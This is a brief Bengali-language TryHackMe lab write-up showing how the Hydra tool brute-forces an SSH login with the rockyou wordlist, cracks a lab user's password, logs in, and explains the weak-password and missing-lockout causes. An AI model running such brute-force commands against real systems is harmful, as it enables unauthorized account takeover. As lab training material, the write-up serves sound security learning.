

-------Hydra Tool-----

Hydra হলো একটি password brute-force / login cracking tool,
যেটা বিভিন্ন network service-এর login credential ভাঙতে ব্যবহার করা হয়।

Hydra সাধারণত ব্যবহার হয়:

* SSH login brute-force
* FTP / HTTP form login attack
* Telnet, SMB, RDP ইত্যাদি test করতে

👉 TryHackMe-এর অনেক room-এই Hydra ব্যবহার করতে হয় (যেমন: *Basic Pentesting*)।



## 🔰 Lab Environment (TryHackMe)

আমি TryHackMe-এ একটি room launch করি এবং পাই:

* **Target IP:** `10.10.10.10` (TryHackMe provided)
* **Service:** SSH
* **Username:** `jan`
* **Wordlist:** `rockyou.txt`

---

## 🔍 Reconnaissance (Hydra চালানোর আগে)

প্রথমে আমি service confirm করি:

```bash
nmap -p 22 10.10.10.10
```

✔️ Port 22 open
➡️ SSH brute-force করা সম্ভব

---

## 🔐 Hydra দিয়ে SSH Brute-Force

আমি নিচের command ব্যবহার করি:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

### 🔎 Command Breakdown:

* `-l jan` → username
* `-P rockyou.txt` → password list
* `ssh://` → service
* `10.10.10.10` → target IP

---

## 💥 Result

কিছু সময় পর Hydra output দেয়:

```
[22][ssh] host: 10.10.10.10  login: jan  password: armando
```

➡️ এখানে আমি valid SSH credential পাই।

---

## 🔓 Successful Login

আমি SSH দিয়ে login করি:

```bash
ssh jan@10.10.10.10
```

✔️ Login successful
➡️ User shell পাওয়া যায়

---

## 🧠 Vulnerability কেন ছিল?

এই vulnerability থাকার কারণ:

* Weak password ব্যবহার করা হয়েছে
* Brute-force protection / rate limit নেই
* Account lockout policy অনুপস্থিত

Authentication weakness সবসময় **high-risk**



